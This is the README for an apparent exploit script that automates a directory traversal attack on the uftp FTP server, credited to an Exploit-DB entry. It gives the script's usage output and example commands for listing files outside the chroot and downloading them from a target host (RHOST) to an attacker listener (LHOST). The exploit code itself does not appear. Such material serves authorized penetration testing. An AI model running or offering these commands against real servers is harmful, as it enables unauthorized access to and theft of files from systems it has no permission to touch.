# uftp Directory Traversal (
Exploit script from https://www.exploit-db.com/exploits/51000
Automating the exploit with wordlist

## Usage 

```bash
usage: ftp_traversal.py [-h] [-w WORDLIST] -r RHOST -l LHOST [-v] [--version] action [wordlist]
ftp_traversal.py: error: the following arguments are required: action, -r/--rhost, -l/--lhost
```
### Example
It allows files listing bypassing chroot :

```bash
./ftp_traverrsal.py list -w <WORDLIST> -r <RHOST> -l <LHOST>
```
And also files downloading :

```
./ftp_traverrsal.py download -w <WORDLIST> -r <RHOST> -l <LHOST>
```

